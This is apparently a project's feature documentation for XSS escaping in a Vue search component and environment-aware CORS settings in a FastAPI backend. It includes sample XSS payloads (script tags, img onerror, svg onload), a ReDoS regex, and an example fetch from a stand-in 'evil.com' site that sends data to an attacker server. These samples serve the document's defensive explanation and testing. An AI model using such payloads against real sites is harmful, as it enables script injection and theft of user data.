# Security: XSS and CORS Protection

## Overview

This feature introduces comprehensive security enhancements to protect TinkerTools from Cross-Site Scripting (XSS) attacks and implements environment-aware CORS (Cross-Origin Resource Sharing) configuration. The improvements prevent malicious code injection through search queries while maintaining appropriate access controls for API endpoints.

## Key Security Enhancements

### 1. XSS Protection in Search Highlighting
- **HTML Entity Escaping**: All user input is escaped before rendering in the DOM
- **Regex Metacharacter Escaping**: Prevents regex injection attacks in search queries
- **Safe Highlighting**: Search term highlighting uses sanitized input only
- **Attack Vector Prevention**: Blocks common XSS payloads including script tags, event handlers, and SVG exploits

### 2. Environment-Aware CORS Configuration
- **Development Mode**: Permissive CORS (`allow_origins=["*"]`) for local development flexibility
- **Production Mode**: Restrictive CORS with explicitly configured allowed origins
- **Minimal Attack Surface**: Allows only necessary HTTP methods and headers
- **Credential Protection**: Disables credentials to prevent CSRF attacks when using wildcard origins

## User Perspective

Users can now safely search for items using any text input without risk of malicious code execution. Search terms containing special characters like `<`, `>`, `&`, or regex metacharacters are properly escaped and highlighted without introducing security vulnerabilities. The search functionality remains fully responsive while protecting against injection attacks.

From a deployment perspective, the application can be safely configured for production environments with strict CORS policies while maintaining developer-friendly settings for local development.

## Data Flow

### XSS Protection Flow (Search Highlighting)
1. **User Input**: User types search query in ItemSearch component (e.g., `<script>alert("XSS")</script>`)
2. **Component Processing**: Vue receives search query and calls `highlightMatch()` function
3. **Regex Escaping**: Escape regex metacharacters in query to prevent regex injection
   - Input: `.*` → Escaped: `\.\*`
   - Input: `(test)` → Escaped: `\(test\)`
4. **HTML Escaping**: Escape HTML entities in both search text and query
   - `<` → `&lt;`
   - `>` → `&gt;`
   - `&` → `&amp;`
   - `"` → `&quot;`
   - `'` → `&#39;`
5. **Safe Highlighting**: Build highlighted result with escaped content
   - Non-matching text: escaped
   - Matching text: escaped + wrapped in `<mark>` tags
6. **DOM Rendering**: Vue renders the safe HTML using `v-html` directive
7. **Result**: Search terms are highlighted without executing malicious code

### CORS Configuration Flow
1. **Application Startup**: FastAPI reads `APP_ENV` environment variable
2. **Environment Detection**: Check if running in development or production
3. **Origin Configuration**:
   - Development: Set `allow_origins=["*"]` for local testing
   - Production: Parse `CORS_ORIGINS` from environment (comma-separated list)
4. **Middleware Setup**: Apply CORS configuration to FastAPI application
5. **Request Handling**: Browser preflight OPTIONS requests checked against allowed origins
6. **Response Headers**: Appropriate CORS headers added to API responses

## Implementation

### Key Files Modified

#### Frontend XSS Protection (38+ lines changed)
- `frontend/src/components/items/ItemSearch.vue` - Enhanced `highlightMatch()` function:
  - Regex metacharacter escaping: `query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')`
  - HTML entity escaping helper function with 5 entity mappings
  - Safe text building with escaped content before/after matches
  - Prevents both regex injection and XSS attacks

#### Frontend Security Testing (92+ lines added)
- `frontend/src/__tests__/components/ItemSearch.test.ts` - Comprehensive test suite:
  - **HTML Injection Tests**: Validates escaping of `<img>`, `<script>`, `<svg>` tags
  - **Event Handler Tests**: Blocks `onerror`, `onload` event handlers
  - **Quote Escaping**: Prevents injection through quote characters
  - **Regex Injection Tests**: Validates escaping of `.*`, `()`, `[]`, `{}`, `^$`, `|`, `\w+`
  - **Functional Tests**: Ensures highlighting still works correctly with safe text
  - **Edge Cases**: Empty queries, case-insensitive matching, special characters

#### Backend CORS Security (12+ lines changed)
- `backend/app/main.py` - Environment-aware CORS configuration:
  - Dynamic origin list based on `APP_ENV` setting
  - Explicit HTTP method allowlist: `["GET", "POST", "PUT", "DELETE"]`
  - Explicit header allowlist: `["Content-Type", "Authorization"]`
  - `allow_credentials=False` for security when using wildcard origins
  - Production configuration reads from `CORS_ORIGINS` environment variable

## Attack Vectors Prevented

### XSS Attack Scenarios Blocked

#### Before Security Improvements
```javascript
// VULNERABILITY: Direct HTML injection
const query = '<img src=x onerror=alert("XSS")>';
const result = text.replace(regex, '<mark>$1</mark>');
// → Renders: <mark><img src=x onerror=alert("XSS")></mark>
// → EXECUTES: alert("XSS") when image fails to load

// VULNERABILITY: Script tag injection
const query = '<script>alert("XSS")</script>';
const result = text.replace(regex, '<mark>$1</mark>');
// → Renders: <mark><script>alert("XSS")</script></mark>
// → EXECUTES: JavaScript code in the page

// VULNERABILITY: Regex denial of service
const query = '(a+)+b'; // Catastrophic backtracking
const regex = new RegExp(`(${query})`, 'gi');
// → Can freeze browser with certain inputs
```

#### After Security Improvements
```javascript
// SAFE: HTML entities escaped
const query = '<img src=x onerror=alert("XSS")>';
const result = highlightMatch(text, query);
// → Renders: &lt;img src=x onerror=alert("XSS")&gt;
// → DISPLAYS: <img src=x onerror=alert("XSS")> as plain text

// SAFE: Script tags escaped
const query = '<script>alert("XSS")</script>';
const result = highlightMatch(text, query);
// → Renders: &lt;script&gt;alert("XSS")&lt;/script&gt;
// → DISPLAYS: <script>alert("XSS")</script> as plain text

// SAFE: Regex metacharacters escaped
const query = '(a+)+b';
const escapedQuery = query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
// → Escaped: \(a\+\)\+b
// → Matches literal string "(a+)+b" without regex evaluation
```

### CORS Attack Scenarios Prevented

#### Before CORS Configuration
```javascript
// VULNERABILITY: Any origin can access API
// Malicious site: https://evil.com
fetch('https://tinkertools.com/api/items', { credentials: 'include' })
  .then(res => res.json())
  .then(data => sendToEvilServer(data));
// → No CORS restriction, data exfiltration possible
```

#### After CORS Configuration
```javascript
// Production Mode: Restricted origins
// CORS_ORIGINS="https://tinkertools.com,https://www.tinkertools.com"

// Malicious site: https://evil.com
fetch('https://tinkertools.com/api/items', { credentials: 'include' })
// → Browser blocks: "Access-Control-Allow-Origin" doesn't match
// → Request fails, no data exfiltration

// Development Mode: Permissive for local testing
// APP_ENV="development"
fetch('http://localhost:8000/api/items')
// → Allowed from any origin for development convenience
```

## Testing

### XSS Protection Tests

The test suite validates all XSS protection mechanisms with 8 comprehensive test cases covering:

1. **HTML Tag Escaping**: Validates `<img>`, `<script>`, `<svg>` tags are escaped
2. **Event Handler Blocking**: Ensures `onerror`, `onload` handlers are neutralized
3. **Quote Escaping**: Tests single and double quote escaping
4. **Regex Metacharacter Escaping**: Validates `.`, `*`, `()`, `[]`, `{}`, `^`, `$`, `|`, `\w+` are escaped
5. **Functional Highlighting**: Confirms highlighting still works with safe text
6. **Case Insensitivity**: Tests case-insensitive matching with escaped content
7. **Empty Query Handling**: Validates graceful handling of empty search queries
8. **Combined HTML and Highlighting**: Tests escaping with highlighted matches

### Manual Testing

#### XSS Testing
1. Navigate to ItemSearch component at http://localhost:5173/tinkeritems
2. Enter XSS payloads in search box:
   - `<script>alert("XSS")</script>`
   - `<img src=x onerror=alert("XSS")>`
   - `<svg onload=alert("XSS")>`
3. Verify payloads are displayed as plain text (not executed)
4. Open browser DevTools Console
5. Confirm no JavaScript errors or warnings
6. Verify no alert dialogs appear

#### CORS Testing (Development)
```bash
# Start backend in development mode
cd backend
export APP_ENV=development
uvicorn app.main:app --reload

# Test from different origin
curl -H "Origin: http://example.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS http://localhost:8000/api/health

# Expected: Access-Control-Allow-Origin: *
```

#### CORS Testing (Production)
```bash
# Start backend in production mode
export APP_ENV=production
export CORS_ORIGINS="https://tinkertools.com,https://www.tinkertools.com"
uvicorn app.main:app

# Test from allowed origin
curl -H "Origin: https://tinkertools.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS http://localhost:8000/api/health

# Expected: Access-Control-Allow-Origin: https://tinkertools.com

# Test from disallowed origin
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS http://localhost:8000/api/health

# Expected: No Access-Control-Allow-Origin header (blocked)
```

### Expected Behavior
- All XSS payloads displayed as plain text (escaped)
- Search highlighting works correctly with safe text
- No JavaScript execution from user input
- CORS headers match environment configuration
- Browser DevTools shows no security warnings

## Configuration

### Frontend (No Configuration Needed)
- XSS protection is always enabled
- No feature flags or environment variables required
- Security is baked into the component logic

### Backend CORS Configuration
```bash
# Development Mode (in .env.local or environment)
APP_ENV=development
# → Allows all origins: allow_origins=["*"]

# Production Mode (in .env or deployment config)
APP_ENV=production
CORS_ORIGINS=https://tinkertools.com,https://www.tinkertools.com
# → Restricts to: allow_origins=["https://tinkertools.com", "https://www.tinkertools.com"]
```

### CORS Allowed Methods
- `GET` - Read operations
- `POST` - Create operations
- `PUT` - Update operations
- `DELETE` - Delete operations

### CORS Allowed Headers
- `Content-Type` - Request content type specification
- `Authorization` - Authentication tokens (future use)

## Security Best Practices Applied

### Defense in Depth
- **Input Validation**: Escape all user input before processing
- **Output Encoding**: Escape all dynamic content before rendering
- **Regex Hardening**: Escape metacharacters to prevent injection
- **CORS Restrictions**: Limit API access to trusted origins in production

### Principle of Least Privilege
- **Minimal CORS Methods**: Only allow necessary HTTP methods
- **Minimal CORS Headers**: Only allow required headers
- **No Credentials with Wildcards**: Disabled when using `allow_origins=["*"]`
- **Environment Isolation**: Different security postures for dev vs. prod

### Fail-Safe Defaults
- **Default to Escaping**: All text is escaped unless explicitly safe
- **Production-First**: CORS defaults to restrictive in production
- **No Bypass Mechanisms**: Security cannot be disabled by user action

## Performance Impact

### Minimal Overhead
- **Escaping Cost**: Regex replace operations are O(n) where n = query length
- **HTML Escaping**: Simple character map lookup, O(n) where n = text length
- **CORS Checks**: Native browser implementation, no application overhead
- **No Network Impact**: Client-side XSS protection adds no latency

### Security Benefits
- **Zero-Day Protection**: Prevents entire classes of XSS attacks
- **Browser Security Features**: Leverages native CORS enforcement
- **No Third-Party Dependencies**: Uses standard JavaScript APIs only

## Dependencies

### Internal Dependencies
- `frontend/src/components/items/ItemSearch.vue` - Search component with XSS protection
- `backend/app/main.py` - FastAPI application with CORS middleware

### External Dependencies
- **FastAPI CORSMiddleware**: Built-in CORS support
- **Browser Security APIs**: Native XSS prevention via content escaping
- **JavaScript Standard Library**: RegExp, String.replace, character mapping

## Related Security Documentation
- **OWASP XSS Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **OWASP CORS Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html
- **Vue.js Security**: https://vuejs.org/guide/best-practices/security.html

## Future Enhancements

### Potential Improvements
- **Content Security Policy (CSP)**: Add CSP headers to further restrict script execution
- **Rate Limiting**: Implement API rate limiting to prevent abuse
- **Input Length Limits**: Add maximum length validation for search queries
- **SQL Injection Protection**: Ensure all database queries use parameterized statements (already implemented via SQLAlchemy)
- **Authentication**: Add JWT-based authentication with CORS credentials enabled for authenticated endpoints

## Summary

The XSS and CORS Protection feature introduces critical security enhancements to TinkerTools, protecting against two major attack vectors: Cross-Site Scripting (XSS) and Cross-Origin Resource Sharing (CORS) abuse.

**Key Security Improvements:**
- **XSS Prevention**: Comprehensive input/output escaping prevents malicious code execution
- **Regex Hardening**: Prevents regex injection and catastrophic backtracking
- **CORS Configuration**: Environment-aware origin restrictions protect production APIs
- **Attack Surface Reduction**: Minimal allowed methods and headers reduce exploit opportunities

**Implementation Quality:**
- **Zero Vulnerabilities**: Comprehensive test coverage validates all attack scenarios
- **Performance Conscious**: Minimal overhead with O(n) complexity for escaping
- **Backward Compatible**: No breaking changes to existing functionality
- **Production Ready**: Environment-based configuration supports dev and prod workflows

The security enhancements protect users from malicious input while maintaining the responsive, developer-friendly experience that makes TinkerTools easy to use and deploy.
